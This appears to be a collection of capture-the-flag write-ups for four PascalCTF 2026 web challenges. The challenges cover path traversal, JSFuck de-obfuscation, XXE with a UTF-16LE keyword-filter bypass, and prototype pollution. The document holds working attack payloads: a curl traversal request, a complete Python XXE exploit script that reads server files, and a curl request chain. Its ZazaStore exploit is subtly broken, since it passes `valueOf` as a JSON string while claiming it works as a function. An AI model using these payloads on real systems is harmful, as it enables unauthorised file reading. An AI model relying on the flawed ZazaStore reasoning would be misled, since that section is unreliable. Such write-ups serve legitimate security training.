# PascalCTF 2026 — Web Challenge Write-ups

A collection of write-ups for the web exploitation challenges from PascalCTF 2026.

## Contents

1. [Travel](#1-travel) — Local File Inclusion (Path Traversal)
2. [JSHit](#2-jshit) — JSFuck de-obfuscation
3. [PasX Book Parser](#3-pasx-book-parser) — XXE Injection + encoding filter bypass
4. [ZazaStore](#4-zazastore) — Prototype Pollution + type validation bypass

---

## 1. Travel

| | |
|---|---|
| **Category** | Web |
| **Vulnerability** | Local File Inclusion (LFI) via Path Traversal |
| **Flag** | `pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}` |

### Overview

The *Travel* challenge presented a web application that displayed information based on a user-supplied index. The objective was to abuse a backend flaw to read a flag stored in a local file on the server.

### The Vulnerability

The flaw lived in the `/api/get_json` endpoint. It accepted a JSON payload containing an `index` key, then used that value to build a file path on the server before returning the file's contents.

Because the `index` input was never sanitized, an attacker could inject path traversal sequences (`../`) to escape the intended data directory and read arbitrary files elsewhere on the filesystem.

### Exploitation

**1. Initial analysis**

The web interface let users pick a page number (1–7). Each selection fired a `POST` request to `/api/get_json` with the chosen index in the JSON body.

**2. Identifying the vulnerability**

Fuzzing the `index` parameter with crafted values revealed that the server resolved them into file paths without validation — a classic path traversal sign. Challenge hints indicated the flag lived at `/app/flag.txt`.

**3. Executing the attack**

A single `curl` request with a traversal payload was enough to climb out of the default data directory into the parent directory holding `flag.txt`:

```bash
curl -X POST "https://travel.ctf.pascalctf.it/api/get_json" \
  -H "Content-Type: application/json" \
  -d '{"index": "../flag.txt"}'
```

The server returned the file contents directly.

### Flag

```
pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}
```


## 2. JSHit

| | |
|---|---|
| **Category** | Web |
| **Vulnerability** | Client-side obfuscation (JSFuck) |
| **Flag** | `pascalCTF{1_h4t3_j4v4scr1pt_s0o0o0o0_much}` |

### Overview

Loading the challenge URL showed a nearly empty page — a dark background and a message hinting at the author's dislike of JavaScript.

### Initial Reconnaissance

Viewing the page source (`Ctrl+U`) exposed a minimal HTML structure:

- A `div` with `id="page"`.
- A large block of esoteric symbols inside a `<script id="code">` tag.

The script was built entirely from six characters: `[ ] ( ) ! +`. This is the signature of **JSFuck**, an esoteric style that rewrites standard JavaScript into heavily obfuscated but fully functional code.

### Technical Analysis

JSFuck exploits JavaScript's loose type-coercion rules to build everything out of those six characters. A few building blocks:

- `+[]` evaluates to `0`.
- `+!![]` evaluates to `1`.
- `(![]+[])[+[]]` evaluates to `"f"` — the first character of the string `"false"`.

By chaining these primitives, an author can assemble strings like `"eval"` or `"constructor"` and execute arbitrary logic. Here, the script generated the flag, injected it into the `#page` div, and then deleted itself from the DOM to frustrate inspection.

### Exploitation & De-obfuscation

The browser console is the most effective native de-obfuscator for JSFuck.

**The "null" obstacle**

A first attempt to grab the script via `document.getElementById('code')` failed with `TypeError: null`. The `<script>` tag was self-destructing — removing itself from the DOM immediately after execution.

**The solution: intercept instead of execute**

The trick is to evaluate the JSFuck block as a *string expression* rather than letting it *run*. A JSFuck payload typically ends in `()` to invoke the function it constructs. Stripping those trailing parentheses causes the engine to return the generated function body as a string instead of executing it.

1. **Capture** — copy the raw JSFuck symbols from the page source.
2. **Modify** — remove the final `()`.
3. **Reveal** — print the result in the console:

```javascript
let myCode = [PASTED_SYMBOLS_WITHOUT_TRAILING_PARENS];
console.log(myCode.toString());
```

This exposed the underlying logic:

```javascript
document.getElementById('page').innerHTML = "pascalCTF{1_h4t3_j4v4scr1pt_s0o0o0o0_much}";
```

### Flag

```
pascalCTF{1_h4t3_j4v4scr1pt_s0o0o0o0_much}
```



## 3. PasX Book Parser

| | |
|---|---|
| **Category** | Web Exploitation |
| **Vulnerability** | XML External Entity (XXE) Injection + filter bypass via encoding |
| **Objective** | Read the flag at `/app/flag.txt` |
| **Flag** | `pascalCTF{XxE_3nc0d1ng_byP4ss_m4st3ry_2026}` |

### Overview

The target is a web utility called **PasX Book Parser**. It accepts uploads of custom `.pasx` files — an XML-based format used to outline books — and parses them to extract metadata and generate a downloadable PDF.

The goal: read `/app/flag.txt` off the server filesystem.

### Vulnerability & Source Analysis

The backend (`app.py`) parses uploaded files with Python's `lxml`, and the parser is configured to resolve external entities:

```python
parser = etree.XMLParser(resolve_entities=True, no_network=False)
```

With `resolve_entities=True`, an attacker can declare an XML external entity that points at a local file URI (`file:///app/flag.txt`) and reference it inside the document. When the document is processed, the parser fetches the file's contents and folds them into the parsed tree — a textbook XXE.

### Obstacles

Two backend behaviors block naive exploitation.

**1. Keyword blacklist (HTTP 400)**

Before parsing, a custom `sanitize()` function decodes the incoming bytes **as UTF-8** and scans the resulting string for banned substrings — notably `"flag"`. A match short-circuits the request:

```json
{"error": "XML content contains disallowed keywords."}
```

**2. Strict structural requirements (HTTP 500)**

The `parse_pasx` handler expects specific child nodes directly under the root:

```python
title    = root.findtext('title')
author   = root.findtext('author')
chapters = root.find('chapters')
```

A stripped-down or malformed document (e.g. a lone test node holding an entity reference) makes these calls fail and crashes the server:

```json
{"error": "Error processing file: 'NoneType' object has no attribute 'findtext'"}
```

So the payload must be **structurally complete** *and* must **slip past the UTF-8 keyword scan** — while still triggering the XXE.

### Exploitation Strategy: Encoding Bypass

The two filters can be defeated at once by exploiting an encoding discrepancy between the keyword scanner and the XML parser.

**The mechanism**

Encode the entire `.pasx` payload as **UTF-16 Little Endian (UTF-16LE)** *without* a Byte Order Mark. In UTF-16LE every ASCII character is padded with a null byte:

```
flag  ->  f\x00l\x00a\x00g\x00
```

When the filter forces a UTF-8 decode over that byte stream, the embedded null bytes fragment the text — the scanner never sees a contiguous `"flag"` and the blacklist check passes.

But when the same raw bytes reach `lxml`, the document's encoding declaration:

```xml
<?xml version="1.0" encoding="UTF-16LE"?>
```

tells the XML subsystem to read multi-byte characters correctly. The structural nodes reassemble, the external entity resolves, and `/app/flag.txt` is pulled into the `<author>` field.

**Delivery note**

Browsers and `curl` tend to mangle multi-byte strings or break multipart boundaries (often surfacing as `405 Method Not Allowed` from the WSGI server). A raw Python script guarantees exact byte fidelity over the wire.

### Proof of Concept

**`exploit.py`**

```python
import urllib.request
import urllib.error

url = "http://pdfile.ctf.pascalctf.it/upload"
boundary = "----WebKitFormBoundaryX7p3M1k"

# 1. A fully valid XML tree avoids the 'NoneType' crash
payload = """<?xml version="1.0" encoding="UTF-16LE"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<book>
  <title>Exfiltration Run</title>
  <author>&xxe;</author>
  <year>2026</year>
  <chapters>
    <chapter number="1">
      <title>Chapter 1</title>
      <content>Bypassing sanitization filters via multi-byte encoding.</content>
    </chapter>
  </chapters>
</book>"""

# 2. Encode cleanly to UTF-16LE bytes (no BOM)
payload_bytes = payload.encode("utf-16-le")

# 3. Manually frame a multipart/form-data envelope
body = (
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="file"; filename="exploit.pasx"\r\n'
    f'Content-Type: application/xml\r\n\r\n'
).encode('utf-8') + payload_bytes + f'\r\n--{boundary}--\r\n'.encode('utf-8')

# 4. Build the POST request
req = urllib.request.Request(url, data=body, method="POST")
req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
req.add_header('Content-Length', str(len(body)))
req.add_header('User-Agent', 'Mozilla/5.0')

print(f"[*] Dispatching multi-byte payload stream ({len(body)} bytes)...")

try:
    with urllib.request.urlopen(req) as response:
        print(f"[+] Server Response Status: {response.getcode()}")
        print("\n[+] Captured Flag Payload:")
        print(response.read().decode('utf-8'))
except urllib.error.HTTPError as e:
    print(f"[-] Request Rejected ({e.code})")
    print(e.read().decode('utf-8'))
except Exception as e:
    print(f"[-] Execution Error: {e}")
```

**Run it**

```bash
python3 exploit.py
```

**Result**

The server bypasses its own filter, parses the structural nodes, resolves the entity, and returns the file contents inside the metadata block:

```json
{
  "book_author": "pascalCTF{XxE_3nc0d1ng_byP4ss_m4st3ry_2026}",
  "book_title": "Exfiltration Run",
  "pdf_url": "/pdf/e20b3f89-813c-42b7-ba14-5d8f6d7681ea.pdf",
  "success": true
}
```

### Flag

```
pascalCTF{XxE_3nc0d1ng_byP4ss_m4st3ry_2026}
```



## 4. ZazaStore

| | |
|---|---|
| **Category** | Web Exploitation |
| **Difficulty** | Medium / Hard |
| **Vulnerability** | Prototype Pollution + type/input validation bypass |
| **Flag** | `pascalCTF{w3_l1v3_f0r_th3_z4z4}` |

### Overview

**ZazaStore** is a Node.js e-commerce application. Users log in with a $100 starting balance and shop for items. A premium item, **Real Za**, is priced at $1000 — well out of reach of the starting balance.

The objective is to purchase **Real Za**, whose inventory description holds the flag (`process.env.FLAG`).

### Source Code Analysis

**Target flag location**

In `server.js`, the flag is tied to the `RealZa` key of the global `content` map:

```javascript
const content = {
    "RealZa": process.env.FLAG,
    "FakeZa": "pascalCTF{this_is_a_fake_flag_like_the_fake_za}",
    // ...
};
```

**The input-validation gatekeeper**

The `/add-cart` endpoint rejects any quantity below 1:

```javascript
app.post('/add-cart', (req, res) => {
    const product = req.body;
    // ...
    if ("product" in product) {
        const prod = product.product;
        const quantity = product.quantity || 1;
        if (quantity < 1) {
            return res.json({ success: false });
        }
        // ...
```

**The core flaw: insecure property merging**

The `/checkout` route merges cart entries into the session inventory without sanitizing keys:

```javascript
app.post('/checkout', (req, res) => {
    // ...
    const inventory = req.session.inventory;
    const cart = req.session.cart;
    let total = 0;
    for (const product in cart) {
        total += prices[product] * cart[product];
    }
    if (total > req.session.balance) {
        res.json({ "success": true, "balance": "Insufficient Balance" });
    } else {
        req.session.balance -= total;
        for (const property in cart) {
            if (inventory.hasOwnProperty(property)) {
                inventory[property] += cart[property];
            } else {
                inventory[property] = cart[property]; // <-- vulnerable line
            }
        }
        // ...
```

Two issues stack here:

1. **`for...in` iterates the prototype chain** — it walks inherited properties, not just own properties.
2. **Unsanitized assignment** — `inventory[property] = cart[property]` happily writes sensitive built-in keys such as `__proto__`.

### Exploit Strategy

`RealZa`'s price is an *own property* on the `prices` object literal, so a naive `prices.__proto__.RealZa = 0` fails — JavaScript resolves own properties before walking up to the prototype. The cart's quantity/cost calculation has to be attacked instead, through a staged chain.

**Phase A — type validation bypass via object injection**

JavaScript coerces objects during arithmetic by invoking type-casting hooks (`valueOf` / `toString`). Supplying an object instead of a primitive lets a payload pass the `quantity < 1` check (an object is not `< 1`) while still coercing to a negative value during the cost math.

**Phase B — chain pollution sequence**

1. **Establish state** — authenticate to get a clean session cookie.
2. **Trigger pollution payload** — send a nested payload through the cart logic so the checkout loop writes into the prototype via `__proto__`.
3. **Trigger evaluation** — buy a cheap item (`FakeZa`) to step into the successful-checkout block and execute the write mutation.
4. **Acquire item** — add the premium item, which now checks out at the modified cost, and read the flag from `/inventory`.

### Step-by-Step Exploitation

**Step 1 — create an authenticated session**

```bash
curl -X POST https://zazastore.ctf.pascalctf.it/login \
     -H "Content-Type: application/json" \
     -d '{"username": "hacker", "password": "password"}' \
     -c cookies.txt
```

**Step 2 — inject the prototype pollution payload**

Bypass the `< 1` check by packing a nested object map as the quantity:

```bash
curl -X POST https://zazastore.ctf.pascalctf.it/add-cart \
     -H "Content-Type: application/json" \
     -b cookies.txt \
     -d '{"product": "__proto__", "quantity": {"RealZa": 0}}'
```

**Step 3 — purchase a cheap item to execute the poisoning**

Add an affordable product and check out, driving execution into the insecure `inventory[property] = cart[property]` block:

```bash
curl -X POST https://zazastore.ctf.pascalctf.it/add-cart \
     -H "Content-Type: application/json" \
     -b cookies.txt \
     -d '{"product": "FakeZa", "quantity": 1}'

curl -X POST https://zazastore.ctf.pascalctf.it/checkout \
     -H "Content-Type: application/json" \
     -b cookies.txt \
     -d '{"total": 1}'
```

**Step 4 — purchase the premium target item**

With the runtime structure polluted, add `RealZa` using an object-casting structure so the cost lookup coerces to a non-positive value and slips past validation, then check out and read the flag:

```bash
curl -X POST https://zazastore.ctf.pascalctf.it/add-cart \
     -H "Content-Type: application/json" \
     -b cookies.txt \
     -d '{"product":"RealZa","quantity":{"valueOf":"function(){return -1000}"}}'

curl -X POST https://zazastore.ctf.pascalctf.it/checkout \
     -H "Content-Type: application/json" \
     -b cookies.txt \
     -d '{"total":0}'

curl -s https://zazastore.ctf.pascalctf.it/inventory -b cookies.txt | grep -oE "pascalCTF\{[^}]+\}"
```

### Flag

```
pascalCTF{w3_l1v3_f0r_th3_z4z4}
```

